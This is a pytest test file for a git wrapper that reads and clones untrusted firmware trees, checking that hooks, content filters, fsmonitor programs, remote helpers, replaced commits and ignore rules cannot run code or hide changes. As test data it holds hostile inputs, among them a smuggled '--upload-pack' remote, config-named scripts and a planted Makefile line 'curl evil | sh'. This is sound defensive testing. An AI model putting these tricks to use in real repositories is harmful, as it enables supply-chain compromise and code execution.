"""Tests for the git porcelain wrapper and the mutating seams."""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from openmv_ota.project import gitrepo
from openmv_ota.project.errors import ProjectError


def test_run_git_and_state(make_firmware):
    repo = make_firmware()
    assert gitrepo.is_git_repo(repo)
    assert len(gitrepo.head_commit(repo)) == 40
    assert gitrepo.current_branch(repo) == "main"
    assert gitrepo.describe(repo)  # any-commit fallback always returns something
    assert gitrepo.is_dirty(repo) is False
    assert gitrepo.remote_url(repo) == "git@github.com:openmv/openmv.git"


def test_dirty_and_no_remote(make_firmware):
    repo = make_firmware(with_remote=False)
    (repo / "SDK_VERSION").write_text("9.9.9")  # uncommitted change
    assert gitrepo.is_dirty(repo) is True
    assert gitrepo.remote_url(repo) is None


def test_detached_head(make_firmware):
    repo = make_firmware()
    sha = gitrepo.head_commit(repo)
    gitrepo.run_git(repo, "checkout", "-q", sha)
    assert gitrepo.current_branch(repo) is None


def test_is_git_repo_false(tmp_path):
    assert gitrepo.is_git_repo(tmp_path) is False


def test_is_git_repo_no_git_binary(monkeypatch, tmp_path):
    monkeypatch.setattr(gitrepo, "GIT", "definitely-not-git-binary-xyz")
    assert gitrepo.is_git_repo(tmp_path) is False


def test_run_git_check_false_returns_none(make_firmware):
    assert gitrepo.run_git(make_firmware(), "rev-parse", "nope", check=False) is None


def test_run_git_check_true_raises(make_firmware):
    with pytest.raises(ProjectError, match="git rev-parse nope failed"):
        gitrepo.run_git(make_firmware(), "rev-parse", "nope")


def test_run_git_missing_binary(monkeypatch, tmp_path):
    monkeypatch.setattr(gitrepo, "GIT", "definitely-not-git-binary-xyz")
    with pytest.raises(ProjectError, match="git not found"):
        gitrepo.run_git(tmp_path, "status")


def test_submodule_status_parsing(monkeypatch, tmp_path):
    out = (
        " 1111111111111111111111111111111111111111 lib/micropython (v1.28.0)\n"
        "-2222222222222222222222222222222222222222 lib/uninit\n"
        "+3333333333333333333333333333333333333333 modules/ulab (6.12)\n"
        "\n"
        "garbage\n"
    )
    monkeypatch.setattr(gitrepo, "run_git", lambda *a, **k: out)
    entries = gitrepo.submodule_status(tmp_path)
    assert {e["path"] for e in entries} == {"lib/micropython", "lib/uninit", "modules/ulab"}
    by_path = {e["path"]: e for e in entries}
    assert by_path["lib/micropython"]["describe"] == "v1.28.0"
    assert by_path["lib/uninit"]["initialized"] is False
    assert by_path["modules/ulab"]["initialized"] is True


def test_submodule_status_keeps_the_first_sha_whole(monkeypatch, tmp_path):
    """run_git strips its output, and with it the FIRST line's leading-space flag. Reading
    line[0] as the flag regardless ate the first character of that submodule's sha -- in
    the lock and the SBOM (lib/apriltag 636b9ba... recorded as 36b9ba..., which OSV then
    refused, failing the whole CVE scan)."""
    out = (" 636b9ba14ba8485c9fc09590cd4ef53f11427966 lib/apriltag (heads/master)\n"
           " 1111111111111111111111111111111111111111 lib/micropython (v1.28.0)\n").strip()
    monkeypatch.setattr(gitrepo, "run_git", lambda *a, **k: out)
    by_path = {e["path"]: e for e in gitrepo.submodule_status(tmp_path)}
    assert by_path["lib/apriltag"]["commit"] == "636b9ba14ba8485c9fc09590cd4ef53f11427966"
    assert by_path["lib/apriltag"]["initialized"] is True
    assert by_path["lib/micropython"]["commit"] == "1" * 40


def test_submodule_remotes_parsing(tmp_path, git_cmd):
    # a REAL .gitmodules read through git config --file (no submodule checkout needed)
    repo = tmp_path / "r"
    repo.mkdir()
    git_cmd(repo, "init", "-q")
    (repo / ".gitmodules").write_text(
        '[submodule "lib/lwip"]\n\tpath = lib/lwip\n\turl = https://github.com/lwip-tcpip/lwip.git\n'
        '[submodule "weird"]\n\turl = https://example.com/only-url.git\n')
    assert gitrepo.submodule_remotes(repo) == {
        "lib/lwip": "https://github.com/lwip-tcpip/lwip.git"}   # path+url joined; url-only skipped
    (repo / ".gitmodules").unlink()
    assert gitrepo.submodule_remotes(repo) == {}                 # no .gitmodules -> empty


def test_submodule_remotes_skips_bare_keys(monkeypatch, tmp_path):
    # an EMPTY config value prints as a key-only line -- skipped, not crashed on
    monkeypatch.setattr(gitrepo, "run_git", lambda *a, **k:
                        "submodule.empty.path\n"
                        "submodule.lib/x.path lib/x\nsubmodule.lib/x.url https://e.com/x.git")
    assert gitrepo.submodule_remotes(tmp_path) == {"lib/x": "https://e.com/x.git"}


def test_resolve_submodules_carries_remotes(monkeypatch, tmp_path):
    from openmv_ota.project.resolve.submodules import resolve_submodules
    monkeypatch.setattr(gitrepo, "submodule_status",
                        lambda repo: [{"path": "lib/lwip", "commit": "c1", "describe": None,
                                       "initialized": True},
                                      {"path": "lib/other", "commit": "c2", "describe": None,
                                       "initialized": True}])
    monkeypatch.setattr(gitrepo, "submodule_remotes",
                        lambda repo: {"lib/lwip": "https://github.com/lwip-tcpip/lwip.git"})
    subs = {e["path"]: e for e in resolve_submodules(tmp_path)}
    assert subs["lib/lwip"]["remote"] == "https://github.com/lwip-tcpip/lwip.git"
    assert subs["lib/other"]["remote"] == ""                     # unmapped -> explicit empty


def test_submodule_status_empty(monkeypatch, tmp_path):
    monkeypatch.setattr(gitrepo, "run_git", lambda *a, **k: None)
    assert gitrepo.submodule_status(tmp_path) == []


# --- mutating seams (mock subprocess) ---------------------------------------

class _FakeRun:
    def __init__(self, fail=None):
        self.calls = []
        self.fail = fail  # exception to raise, or None

    def __call__(self, cmd, **kwargs):
        self.calls.append((cmd, kwargs))
        if self.fail is not None:
            raise self.fail
        return subprocess.CompletedProcess(cmd, 0)


def test_clone_with_commit(monkeypatch, tmp_path):
    fake = _FakeRun()
    monkeypatch.setattr(gitrepo.subprocess, "run", fake)
    gitrepo.clone("git@x:openmv.git", tmp_path / "dst", commit="ab" * 20)
    assert any("clone" in c[0] for c in fake.calls)
    assert any("checkout" in c[0] for c in fake.calls)


def test_clone_takes_nothing_from_a_lock_file_as_an_option(monkeypatch, tmp_path):
    """The remote and the commit come from openmv-ota.lock.json, which someone else may have
    written: `--upload-pack=...` as a remote would be a command."""
    fake = _FakeRun()
    monkeypatch.setattr(gitrepo.subprocess, "run", fake)
    gitrepo.clone("--upload-pack=touch /tmp/x;", tmp_path / "dst")
    argv = fake.calls[0][0]
    assert argv[argv.index("clone") + 1] == "--"            # the remote is past the options
    for commit in ("abc", "--orphan", "ab" * 20 + ":x", "HEAD"):
        with pytest.raises(ProjectError, match="not a commit hash"):
            gitrepo.clone("r", tmp_path / "d2", commit=commit)
    assert len(fake.calls) == 1                             # refused before git ran


def test_clone_without_commit(monkeypatch, tmp_path):
    fake = _FakeRun()
    monkeypatch.setattr(gitrepo.subprocess, "run", fake)
    gitrepo.clone("git@x:openmv.git", tmp_path / "dst")
    assert not any("checkout" in c[0] for c in fake.calls)


def test_clone_failure(monkeypatch, tmp_path):
    monkeypatch.setattr(gitrepo.subprocess, "run",
                        _FakeRun(fail=subprocess.CalledProcessError(1, "git")))
    with pytest.raises(ProjectError) as ei:
        gitrepo.clone("r", tmp_path / "d")
    assert ei.value.exit_code == 1


def test_submodule_update(monkeypatch, tmp_path):
    fake = _FakeRun()
    monkeypatch.setattr(gitrepo.subprocess, "run", fake)
    gitrepo.submodule_update(tmp_path)
    assert any("submodule" in c[0] for c in fake.calls)


def test_submodule_update_failure(monkeypatch, tmp_path):
    monkeypatch.setattr(gitrepo.subprocess, "run", _FakeRun(fail=FileNotFoundError()))
    with pytest.raises(ProjectError):
        gitrepo.submodule_update(tmp_path)


def test_pip_install(monkeypatch):
    fake = _FakeRun()
    monkeypatch.setattr(gitrepo.subprocess, "run", fake)
    gitrepo.pip_install("mpy-cross==1.28.0")
    assert fake.calls[0][0][1:] == ["-P", "-m", "pip", "install", "mpy-cross==1.28.0"]


def test_pip_install_failure(monkeypatch):
    monkeypatch.setattr(gitrepo.subprocess, "run",
                        _FakeRun(fail=subprocess.CalledProcessError(1, "pip")))
    with pytest.raises(ProjectError) as ei:
        gitrepo.pip_install("mpy-cross==1.28.0")
    assert ei.value.exit_code == 1


def test_git_runs_nothing_the_tree_s_own_config_names(make_firmware, tmp_path):
    """A firmware tree is one the project was pointed at. Its config can name a program for
    git to run on `status` (a filesystem monitor); reading the tree must not run it."""
    repo = make_firmware()
    ran = tmp_path / "ran"
    hook = tmp_path / "monitor.sh"
    hook.write_text("#!/bin/sh\ntouch %s\n" % ran)
    hook.chmod(0o755)
    gitrepo.run_git(repo, "config", "core.fsmonitor", str(hook))
    gitrepo.run_git(repo, "status", "--porcelain")
    assert not ran.exists()


def test_git_runs_no_filter_the_tree_s_own_config_defines(make_firmware, tmp_path, monkeypatch):
    """`git status` runs a content filter's `clean` program on a changed file."""
    repo = make_firmware()
    ran = tmp_path / "ran"
    prog = tmp_path / "clean.sh"
    prog.write_text("#!/bin/sh\ntouch %s\ncat\n" % ran)
    prog.chmod(0o755)
    tracked = [p for p in repo.iterdir() if p.is_file() and p.name != ".gitattributes"][0]
    (repo / ".gitattributes").write_text("* filter=x\n")
    gitrepo.run_git(repo, "config", "filter.x.clean", str(prog))
    tracked.write_bytes(tracked.read_bytes()[::-1] or b"x")
    gitrepo.run_git(repo, "status", "--porcelain")
    assert gitrepo.is_dirty(repo) and not ran.exists()
    monkeypatch.setattr(gitrepo, "GIT", str(tmp_path / "no-such-git"))
    assert gitrepo._no_filters(repo) == {}


def _clean_prog(tmp_path):
    ran = tmp_path / "ran"
    prog = tmp_path / "clean.sh"
    prog.write_text("#!/bin/sh\ntouch %s\ncat\n" % ran)
    prog.chmod(0o755)
    return ran, prog


def _add_submodule(repo, inner):
    for args in (("-c", "protocol.file.allow=always", "submodule", "add", "-q", str(inner),
                  "lib/inner"),
                 ("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "sub")):
        subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


def _change_a_file(repo, attributes):
    tracked = [p for p in repo.iterdir() if p.is_file() and p.name != ".gitattributes"][0]
    (repo / ".gitattributes").write_text(attributes)
    tracked.write_bytes(tracked.read_bytes() + b"x")


def test_a_filter_is_found_wherever_the_tree_s_config_keeps_it(make_firmware, tmp_path):
    """In a file the config includes, in a worktree's config, under a name with an `=` in
    it: each is the tree's own, and none of them runs."""
    ran, prog = _clean_prog(tmp_path)
    repo = make_firmware()
    (repo / ".git" / "more").write_text('[filter "inc"]\n\tclean = %s\n' % prog)
    gitrepo.run_git(repo, "config", "include.path", "more")
    gitrepo.run_git(repo, "config", "extensions.worktreeConfig", "true")
    gitrepo.run_git(repo, "config", "--worktree", "filter.wt.clean", str(prog))
    gitrepo.run_git(repo, "config", "filter.a=b.clean", str(prog))
    for name in ("inc", "wt", "a=b"):
        _change_a_file(repo, "* filter=%s\n" % name)
        assert gitrepo.is_dirty(repo) and gitrepo.describe(repo).endswith("-dirty")
        assert not ran.exists(), name


def test_a_submodule_s_filter_does_not_run(make_firmware, tmp_path):
    """`git status` looks into a submodule with the submodule's own config."""
    ran, prog = _clean_prog(tmp_path)
    repo = make_firmware()
    inner = make_firmware("inner")
    _add_submodule(repo, inner)
    sub = repo / "lib" / "inner"
    gitrepo.run_git(sub, "config", "filter.x.clean", str(prog))
    _change_a_file(sub, "* filter=x\n")
    assert gitrepo.is_dirty(repo) and gitrepo.dirty_paths(repo)
    assert not ran.exists()
    # ...and the filter is live: git runs it when nothing stands in the way (a diff always
    # reads the file; a status does only when the file's times leave it in doubt)
    subprocess.run(["git", "-C", str(sub), "diff", "--quiet"], capture_output=True)
    assert ran.exists()


def test_a_tree_git_would_read_somewhere_else_is_refused(make_firmware, tmp_path):
    """The filters are collected from the tree this walks. A submodule path that is a link
    to another repository, or a config that moves the worktree, has git read another."""
    ran, prog = _clean_prog(tmp_path)
    other = make_firmware("other")
    gitrepo.run_git(other, "config", "filter.x.clean", str(prog))
    _change_a_file(other, "* filter=x\n")
    repo = make_firmware()
    inner = make_firmware("inner")
    _add_submodule(repo, inner)
    assert not gitrepo.is_dirty(repo / "lib")                   # from a directory inside it
    import shutil
    shutil.rmtree(repo / "lib" / "inner")
    (repo / "lib" / "inner").symlink_to(other)
    with pytest.raises(ProjectError, match="is a link"):
        gitrepo.is_dirty(repo)
    moved = make_firmware("moved")
    gitrepo.run_git(moved, "config", "core.worktree", str(other))
    with pytest.raises(ProjectError, match="another tree"):
        gitrepo.describe(moved)
    # ...moved to a directory ABOVE it: from there git lists another index, or none, and
    # still reads this one's submodule with the submodule's own config
    above = make_firmware("above")
    _add_submodule(above, inner)
    gitrepo.run_git(above / "lib" / "inner", "config", "filter.x.clean", str(prog))
    _change_a_file(above / "lib" / "inner", "* filter=x\n")
    gitrepo.run_git(above, "config", "core.worktree", str(tmp_path))
    with pytest.raises(ProjectError, match="another tree"):
        gitrepo.describe(above)
    assert not ran.exists()
    assert gitrepo.dirty_paths(tmp_path) == []                  # no tree at all: nothing to read


def test_git_fetches_nothing_to_read_a_tree(make_firmware, tmp_path):
    """A tree set up as a partial clone with an object missing has git fetch it on any
    read, with the program the tree's config names for the remote."""
    ran = tmp_path / "ran"
    repo = make_firmware()
    tree = gitrepo.run_git(repo, "rev-parse", "HEAD^{tree}")
    for key, value in (("extensions.partialClone", "origin"), ("remote.origin.promisor", "true"),
                       ("remote.origin.url", str(tmp_path / "elsewhere")),
                       ("remote.origin.uploadpack", "touch %s;" % ran)):
        gitrepo.run_git(repo, "config", key, value)
    (repo / ".git" / "objects" / tree[:2] / tree[2:]).unlink()
    for read in (gitrepo.is_dirty, gitrepo.describe, gitrepo.submodule_status):
        try:
            read(repo)
        except ProjectError:
            pass                                                # it cannot be read: fine
    assert not ran.exists()
    subprocess.run(["git", "-C", str(repo), "status"], capture_output=True)
    assert ran.exists()                                         # git, left to itself, runs it


def test_config_the_caller_s_environment_carries_is_kept(make_firmware, tmp_path, monkeypatch):
    """A CI passes `safe.directory` this way; the filter overrides go after it."""
    repo = make_firmware()
    gitrepo.run_git(repo, "config", "filter.x.clean", "false")
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "user.name")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "someone")
    assert gitrepo.run_git(repo, "config", "user.name") == "someone"
    env = gitrepo._no_filters(repo)
    assert env["GIT_CONFIG_COUNT"] == "5" and env["GIT_CONFIG_KEY_1"] == "filter.x.clean"
    monkeypatch.setenv("GIT_CONFIG_COUNT", "many")
    assert gitrepo._no_filters(repo)["GIT_CONFIG_COUNT"] == "4"


def test_a_file_git_cannot_vouch_for_is_not_untracked(make_firmware, tmp_path, monkeypatch):
    """`untracked` is True only when the repository the file is in says so: where there is
    none, or git cannot be run, it has not said."""
    repo = make_firmware(with_mpy_cross=True)
    built = repo / "lib" / "micropython" / "mpy-cross" / "build" / "mpy-cross"
    assert gitrepo.untracked(built) is True
    assert gitrepo.untracked(repo / "SDK_VERSION") is False
    loose = tmp_path / "loose"
    loose.mkdir()
    (loose / "mpy-cross").write_text("")
    monkeypatch.setenv("GIT_CEILING_DIRECTORIES", str(tmp_path))
    assert gitrepo.untracked(loose / "mpy-cross") is None
    monkeypatch.setattr(gitrepo, "GIT", str(tmp_path / "no-such-git"))
    assert gitrepo.untracked(built) is None


# --- what a firmware tree can hide from `git status` ---------------------------------------

def _git(repo, *args):
    return subprocess.run(["git", "-C", str(repo), "-c", "user.email=t@t", "-c", "user.name=t",
                           *args], check=True, capture_output=True, text=True).stdout.strip()


def _plain_status(repo):
    """What `git status` says, left to the tree's own config."""
    return _git(repo, "status", "--porcelain")


def _replaced(repo, name="Makefile"):
    """Commit an evil ``name`` on top of HEAD, move the branch back, and have the pinned
    commit read as the evil one (t_replace_ref.sh): the files are the evil commit's, HEAD
    names the pinned one."""
    pinned = _git(repo, "rev-parse", "HEAD")
    (repo / name).write_text("all:; @curl evil | sh\n")
    _git(repo, "add", name)
    _git(repo, "commit", "-qm", "evil")
    evil = _git(repo, "rev-parse", "HEAD")
    _git(repo, "update-ref", "refs/heads/main", pinned)
    _git(repo, "replace", "-f", pinned, evil)
    return pinned


def test_a_replaced_commit_does_not_pass_for_the_pinned_one(make_firmware):
    repo = make_firmware()
    pinned = _replaced(repo)
    assert _plain_status(repo) == ""                            # clean, to git left alone
    assert gitrepo.head_commit(repo) == pinned
    assert gitrepo.is_dirty(repo) and gitrepo.describe(repo).endswith("-dirty")
    assert gitrepo.dirty_paths(repo) == ["A Makefile",
                                         "refs/replace/%s (a replaced object)" % pinned]


def test_a_replaced_commit_in_a_submodule_does_not_pass_either(make_firmware):
    """The git a submodule's status runs drops GIT_NO_REPLACE_OBJECTS."""
    repo, inner = make_firmware(), make_firmware("inner")
    _add_submodule(repo, inner)
    pinned = _replaced(repo / "lib" / "inner")
    assert _plain_status(repo) == ""
    assert gitrepo.is_dirty(repo)
    assert gitrepo.dirty_paths(repo) == ["A lib/inner/Makefile",
                                         "lib/inner/refs/replace/%s (a replaced object)" % pinned]


@pytest.mark.parametrize("bit", ["--skip-worktree", "--assume-unchanged"])
def test_a_file_the_index_has_git_not_look_at_is_named(make_firmware, bit):
    repo, inner = make_firmware(), make_firmware("inner")
    _add_submodule(repo, inner)
    for where in (repo, repo / "lib" / "inner"):
        _git(where, "update-index", bit, "SDK_VERSION")
        (where / "SDK_VERSION").write_text("evil")
    assert _plain_status(repo) == ""
    assert gitrepo.dirty_paths(repo) == [
        "SDK_VERSION (git is told not to look at it)",
        "lib/inner/SDK_VERSION (git is told not to look at it)"]


def test_a_file_the_tree_s_own_config_ignores_is_named(make_firmware):
    """`info/exclude`, `core.excludesFile` and an untracked .gitignore that ignores itself each
    keep a new source file out of `git status`; a build's own output is all git may ignore."""
    repo, inner = make_firmware(with_mpy_cross=True), make_firmware("inner")
    _add_submodule(repo, inner)
    sub = repo / "lib" / "inner"
    (repo / "evil.c").write_text("void backdoor(void) {}\n")
    (repo / ".git" / "info" / "exclude").write_text("evil.c\n")
    (repo / "boards" / "evil.mk").write_text("x")
    (repo / "boards" / ".gitignore").write_text("evil.mk\n.gitignore\n")
    (repo / "tools.h").write_text("x")
    excludes = repo.parent / "excludes"
    excludes.write_text("tools.h\n")
    _git(repo, "config", "core.excludesFile", str(excludes))
    (sub / "evil.c").write_text("x")
    (Path(_git(sub, "rev-parse", "--absolute-git-dir")) / "info" / "exclude").write_text("evil.c\n")
    # ...and what a build leaves: make's output, the host mpy-cross, byte-code caches -- ignored
    # as files (`*.pyc`, as openmv's .gitignore has it, which git then names one by one) or as
    # a directory (`__pycache__/`, as micropython's has it)
    for left in ("build", "tools/__pycache__", "lib/inner/__pycache__"):
        (repo / left).mkdir(parents=True, exist_ok=True)
        (repo / left / "x.cpython-312.pyc").write_text("x")
    (repo / ".gitignore").write_text("lib/micropython/mpy-cross/build/\nbuild/\n*.pyc\n")
    (sub / ".gitignore").write_text("__pycache__/\n")
    _git(repo, "add", ".gitignore")
    _git(sub, "add", ".gitignore")
    _git(sub, "commit", "-qm", "ignore")
    _git(repo, "add", "lib/inner")
    _git(repo, "commit", "-qm", "ignore")
    assert _plain_status(repo) == ""
    assert gitrepo.dirty_paths(repo, limit=10) == [
        "!! boards/.gitignore", "!! boards/evil.mk", "!! evil.c", "!! tools.h",
        "!! lib/inner/evil.c"]


def test_untracked_files_are_listed_whatever_the_tree_s_config_says(make_firmware):
    repo, inner = make_firmware(), make_firmware("inner")
    _add_submodule(repo, inner)
    sub = repo / "lib" / "inner"
    for where in (repo, sub):
        _git(where, "config", "status.showUntrackedFiles", "no")
        (where / "boards" / "new").mkdir()
        (where / "boards" / "new" / "evil.c").write_text("x")
    assert _plain_status(repo) == ""
    assert gitrepo.is_dirty(repo)
    assert gitrepo.dirty_paths(repo) == ["?? boards/new/evil.c", "?? lib/inner/boards/new/evil.c"]


def test_a_submodule_s_changes_are_seen_whatever_config_says_to_ignore(make_firmware):
    """The superproject's `submodule.<name>.ignore` and `diff.ignoreSubmodules`, and the same in
    a submodule for the ones nested in it, which the superproject's own status cannot
    override one level down."""
    repo, inner, deeper = make_firmware(), make_firmware("inner"), make_firmware("deeper")
    _add_submodule(inner, deeper)
    _add_submodule(repo, inner)
    _git(repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive",
         "-q")
    sub, nested = repo / "lib" / "inner", repo / "lib" / "inner" / "lib" / "inner"
    _git(repo, "config", "submodule.lib/inner.ignore", "all")
    _git(repo, "config", "diff.ignoreSubmodules", "all")
    (sub / "SDK_VERSION").write_text("evil")
    assert _plain_status(repo) == ""
    assert gitrepo.is_dirty(repo)
    assert gitrepo.dirty_paths(repo) == ["M lib/inner/SDK_VERSION"]
    _git(sub, "checkout", "-q", "SDK_VERSION")
    _git(sub, "config", "submodule.lib/inner.ignore", "all")
    (nested / "x.c").write_text("x")
    _git(nested, "add", "x.c")
    _git(nested, "commit", "-qm", "moved")
    assert _plain_status(sub) == ""
    assert gitrepo.dirty_paths(repo) == ["M lib/inner/lib/inner"]


def test_a_changed_file_is_read_whatever_the_tree_says_of_its_recorded_stat(make_firmware):
    """With `core.checkStat=minimal` a file of the size and mtime the index records is taken
    as unchanged without being read: an archive keeps both, and only the inode (and the
    times git is told not to trust) tell an extracted file from the one indexed."""
    import os
    repo = make_firmware()
    f, new = repo / "SDK_VERSION", repo / "new"
    os.utime(f, (1_600_000_000, 1_600_000_000))
    _git(repo, "update-index", "--refresh")
    _git(repo, "config", "core.checkStat", "minimal")
    new.write_text("6.6.6")                                     # the fixture's 1.6.0, same size
    os.utime(new, (1_600_000_000, 1_600_000_000))
    os.replace(new, f)
    assert _plain_status(repo) == ""
    assert gitrepo.is_dirty(repo) and gitrepo.dirty_paths(repo) == ["M SDK_VERSION"]


def test_dirty_paths_names_a_rename_once_and_counts_the_rest(make_firmware, monkeypatch, tmp_path):
    repo = make_firmware()
    _git(repo, "mv", "SDK_VERSION", "SDK")
    for i in range(6):
        (repo / ("n%d" % i)).write_text("x")
    assert gitrepo.dirty_paths(repo) == ["R SDK", "?? n0", "?? n1", "?? n2", "?? n3",
                                         "... and 2 more"]
    monkeypatch.setattr(gitrepo, "GIT", str(tmp_path / "no-such-git"))
    with pytest.raises(ProjectError, match="git not found"):
        gitrepo.dirty_paths(repo)


def test_clone_and_submodule_update_fetch_only_over_a_firmware_remote_s_transports(monkeypatch,
                                                                                tmp_path):
    """They fetch, so they may, but not over `ext::` or a remote helper, and with the rest
    of the reads' hardening: no hooks, no filesystem monitor, no replaced objects."""
    fake = _FakeRun()
    monkeypatch.setattr(gitrepo.subprocess, "run", fake)
    gitrepo.clone("git@x:openmv.git", tmp_path / "dst", commit="ab" * 20)
    gitrepo.submodule_update(tmp_path / "dst")
    (_, ck), (_, co), (_, sk) = fake.calls
    assert [ck["env"]["GIT_ALLOW_PROTOCOL"], co["env"]["GIT_ALLOW_PROTOCOL"],
            sk["env"]["GIT_ALLOW_PROTOCOL"]] == ["https:ssh:file", "", "https:ssh"]
    for argv, kw in fake.calls:
        assert argv[1:1 + len(gitrepo._QUIET)] == list(gitrepo._QUIET)
        assert kw["env"]["GIT_NO_REPLACE_OBJECTS"] == "1"


def test_clone_refuses_a_remote_that_names_a_program(tmp_path, monkeypatch):
    """`evil::x` has git run `git-remote-evil` from PATH, which git's own policy allows."""
    import os
    ran, bin_dir = tmp_path / "ran", tmp_path / "bin"
    bin_dir.mkdir()
    helper = bin_dir / "git-remote-evil"
    helper.write_text("#!/bin/sh\ntouch %s\nexit 1\n" % ran)
    helper.chmod(0o755)
    monkeypatch.setenv("PATH", "%s%s%s" % (bin_dir, os.pathsep, os.environ["PATH"]))
    with pytest.raises(ProjectError, match="git clone failed"):
        gitrepo.clone("evil::x", tmp_path / "dst")
    assert not ran.exists()
    subprocess.run(["git", "clone", "evil::x", str(tmp_path / "d2")], capture_output=True)
    assert ran.exists()                                         # git, left to itself, runs it
